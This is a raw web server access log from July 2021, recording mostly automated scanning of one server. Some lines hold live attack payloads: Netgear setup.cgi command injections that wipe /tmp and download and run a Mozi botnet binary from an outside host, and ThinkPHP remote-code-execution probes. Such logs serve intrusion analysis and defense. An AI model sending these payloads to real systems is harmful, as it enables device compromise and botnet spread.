34.208.176.216 - - [25/Jul/2021:03:04:53 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:03:23:48 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
189.4.191.23 - - [25/Jul/2021:04:10:46 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
34.208.176.216 - - [25/Jul/2021:04:12:03 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:04:23:38 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
34.208.176.216 - - [25/Jul/2021:05:04:20 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
162.142.125.39 - - [25/Jul/2021:05:16:09 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.39 - - [25/Jul/2021:05:16:09 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [25/Jul/2021:05:20:32 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
34.208.176.216 - - [25/Jul/2021:06:03:27 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:06:18:21 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
180.149.125.175 - - [25/Jul/2021:06:42:23 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
34.208.176.216 - - [25/Jul/2021:07:03:31 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:07:18:18 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
78.108.177.51 - - [25/Jul/2021:07:29:19 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
34.208.176.216 - - [25/Jul/2021:08:03:28 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:08:18:15 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
61.52.49.131 - - [25/Jul/2021:09:09:57 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 232 "-" "-"
173.208.236.114 - - [25/Jul/2021:09:24:34 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
216.218.206.66 - - [25/Jul/2021:10:15:52 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
173.208.236.114 - - [25/Jul/2021:10:24:39 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [25/Jul/2021:10:43:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [25/Jul/2021:11:24:42 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
185.142.236.34 - - [25/Jul/2021:11:37:05 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.34 - - [25/Jul/2021:11:37:06 +0000] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
34.79.68.246 - - [25/Jul/2021:11:40:24 +0000] "GET / HTTP/1.1" 200 0 "-" "python-requests/2.26.0"
74.120.14.53 - - [25/Jul/2021:11:44:35 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
74.120.14.53 - - [25/Jul/2021:11:44:35 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [25/Jul/2021:12:28:09 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:13:28:05 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:14:28:55 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [25/Jul/2021:14:30:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [25/Jul/2021:15:23:49 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:16:23:56 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
162.142.125.56 - - [25/Jul/2021:17:07:30 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.56 - - [25/Jul/2021:17:07:31 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [25/Jul/2021:17:23:48 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [25/Jul/2021:17:44:56 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [25/Jul/2021:18:19:41 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.17.96.42 - - [25/Jul/2021:18:31:37 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
34.208.176.216 - - [25/Jul/2021:19:04:01 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:19:19:43 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
162.142.125.39 - - [25/Jul/2021:19:26:57 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.39 - - [25/Jul/2021:19:26:57 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
34.208.176.216 - - [25/Jul/2021:20:03:55 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:20:19:50 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
93.174.89.216 - - [25/Jul/2021:20:22:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
34.208.176.216 - - [25/Jul/2021:21:04:00 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:21:19:49 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
198.98.59.211 - - [25/Jul/2021:21:22:08 +0000] "GET / HTTP/1.1" 200 0 "http://54.193.239.191:8080/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
192.241.223.21 - - [25/Jul/2021:21:52:50 +0000] "GET /manager/text/list HTTP/1.1" 404 232 "-" "Mozilla/5.0 zgrab/0.x"
34.208.176.216 - - [25/Jul/2021:22:03:58 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:22:19:48 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
128.14.134.170 - - [25/Jul/2021:22:52:45 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
34.208.176.216 - - [25/Jul/2021:23:03:58 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [25/Jul/2021:23:19:40 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.17.96.218 - - [25/Jul/2021:23:51:48 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
34.208.176.216 - - [26/Jul/2021:00:03:44 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:00:19:10 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
34.208.176.216 - - [26/Jul/2021:01:03:48 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:01:19:34 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
188.166.152.210 - - [26/Jul/2021:02:00:22 +0000] "GET / HTTP/1.0" 200 0 "-" "-"
34.208.176.216 - - [26/Jul/2021:02:05:34 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:02:19:54 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
192.241.209.126 - - [26/Jul/2021:02:21:39 +0000] "GET /actuator/health HTTP/1.1" 404 232 "-" "Mozilla/5.0 zgrab/0.x"
205.185.120.237 - - [26/Jul/2021:02:37:45 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.205.120 - - [26/Jul/2021:02:48:56 +0000] "GET /hudson HTTP/1.1" 404 232 "-" "Mozilla/5.0 zgrab/0.x"
46.174.191.28 - - [26/Jul/2021:02:55:04 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
34.208.176.216 - - [26/Jul/2021:03:05:43 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:03:20:22 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
109.234.153.130 - - [26/Jul/2021:03:25:26 +0000] "CONNECT 91.214.48.87:80 HTTP/1.1" 405 178 "-" "-"
109.234.153.130 - - [26/Jul/2021:03:25:36 +0000] "POST http://proxy.kagda.ru/myip2.php?Z77849768190Q1 HTTP/1.1" 405 178 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0"
192.241.221.14 - - [26/Jul/2021:03:55:02 +0000] "GET /manager/html HTTP/1.1" 404 232 "-" "Mozilla/5.0 zgrab/0.x"
34.208.176.216 - - [26/Jul/2021:04:04:10 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:04:20:12 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
34.208.176.216 - - [26/Jul/2021:05:04:01 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:05:20:18 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:06:24:07 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:07:24:31 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [26/Jul/2021:08:18:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [26/Jul/2021:08:24:19 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
5.187.42.244 - - [26/Jul/2021:09:06:51 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
186.4.222.153 - - [26/Jul/2021:09:15:11 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
173.208.236.114 - - [26/Jul/2021:09:22:52 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
78.108.177.50 - - [26/Jul/2021:10:08:51 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
173.208.236.114 - - [26/Jul/2021:10:22:54 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
167.248.133.55 - - [26/Jul/2021:10:52:10 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
167.248.133.55 - - [26/Jul/2021:10:52:10 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
193.118.53.194 - - [26/Jul/2021:10:53:32 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
103.199.112.132 - - [26/Jul/2021:11:05:03 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
173.208.236.114 - - [26/Jul/2021:11:22:45 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
74.120.14.38 - - [26/Jul/2021:12:14:11 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
74.120.14.38 - - [26/Jul/2021:12:14:11 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [26/Jul/2021:12:19:12 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
34.208.176.216 - - [26/Jul/2021:13:03:39 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
27.45.39.25 - - [26/Jul/2021:13:11:56 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.39.25:47338/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 232 "-" "-"
173.208.236.114 - - [26/Jul/2021:13:19:19 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
185.128.41.50 - - [26/Jul/2021:13:26:55 +0000] "POST /invoker/readonly HTTP/1.1" 405 178 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)"
185.128.41.50 - - [26/Jul/2021:13:26:56 +0000] "POST /invoker/readonly HTTP/1.1" 405 178 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)"
185.128.41.50 - - [26/Jul/2021:13:26:56 +0000] "POST /invoker/readonly HTTP/1.1" 405 178 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)"
185.128.41.50 - - [26/Jul/2021:13:26:57 +0000] "POST /invoker/readonly HTTP/1.1" 405 178 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)"
185.128.41.50 - - [26/Jul/2021:13:26:57 +0000] "GET /manager/html HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:58 +0000] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo() HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:58 +0000] "GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo() HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:58 +0000] "GET /public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:58 +0000] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:59 +0000] "GET /index.php?s=index/\think\Request/input&filter=phpinfo&data=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:59 +0000] "GET /public/?s=index/\think\Request/input&filter=phpinfo&data=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:26:59 +0000] "GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:27:00 +0000] "GET /public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:27:00 +0000] "GET /index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:27:01 +0000] "GET /public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:27:01 +0000] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 232 "-" "Java/1.8.0_131"
185.128.41.50 - - [26/Jul/2021:13:27:02 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:02 +0000] "POST /index HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:02 +0000] "POST /index.do HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:02 +0000] "POST /index.action HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:03 +0000] "POST /login HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:03 +0000] "POST /login.do HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:03 +0000] "POST /login.action HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:04 +0000] "POST /index.jsp HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
185.128.41.50 - - [26/Jul/2021:13:27:04 +0000] "POST /login.jsp HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
46.174.191.28 - - [26/Jul/2021:13:27:42 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
34.208.176.216 - - [26/Jul/2021:14:03:46 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:14:19:32 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
34.208.176.216 - - [26/Jul/2021:15:03:48 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [26/Jul/2021:15:22:53 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [26/Jul/2021:15:25:34 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
71.6.232.4 - - [26/Jul/2021:15:49:48 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
209.141.32.217 - - [26/Jul/2021:16:24:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [26/Jul/2021:16:25:38 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:17:25:45 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
189.139.235.39 - - [26/Jul/2021:17:30:18 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
213.6.209.190 - - [26/Jul/2021:17:50:39 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
58.97.208.8 - - [26/Jul/2021:17:55:19 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
183.136.225.14 - - [26/Jul/2021:17:57:01 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.14 - - [26/Jul/2021:17:57:01 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.14 - - [26/Jul/2021:17:57:01 +0000] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
173.208.236.114 - - [26/Jul/2021:18:20:25 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
91.234.62.236 - - [26/Jul/2021:18:24:14 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 232 "-" "-"
34.208.176.216 - - [26/Jul/2021:19:03:52 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:19:20:21 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
78.108.177.54 - - [26/Jul/2021:19:38:55 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
34.208.176.216 - - [26/Jul/2021:20:04:58 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:20:20:26 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.17.97.18 - - [26/Jul/2021:20:45:29 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.47.35 - - [26/Jul/2021:20:59:57 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
50.31.21.8 - - [26/Jul/2021:21:11:07 +0000] "GET / HTTP/1.0" 200 0 "-" "-"
50.31.21.8 - - [26/Jul/2021:21:11:07 +0000] "OPTIONS / HTTP/1.0" 200 0 "-" "-"
50.31.21.8 - - [26/Jul/2021:21:11:08 +0000] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 232 "-" "-"
50.31.21.8 - - [26/Jul/2021:21:13:05 +0000] "GET /nmaplowercheck1627333984 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Linux; Android 10; Pixel 2 XL Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36"
50.31.21.8 - - [26/Jul/2021:21:13:05 +0000] "GET /evox/about HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Linux; Android 10; Pixel 2 XL Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36"
50.31.21.8 - - [26/Jul/2021:21:13:06 +0000] "POST /sdk HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Linux; Android 10; Pixel 2 XL Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36"
50.31.21.8 - - [26/Jul/2021:21:13:06 +0000] "GET /HNAP1 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Linux; Android 10; Pixel 2 XL Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36"
209.141.32.217 - - [26/Jul/2021:21:25:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [26/Jul/2021:21:26:50 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [26/Jul/2021:22:26:51 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
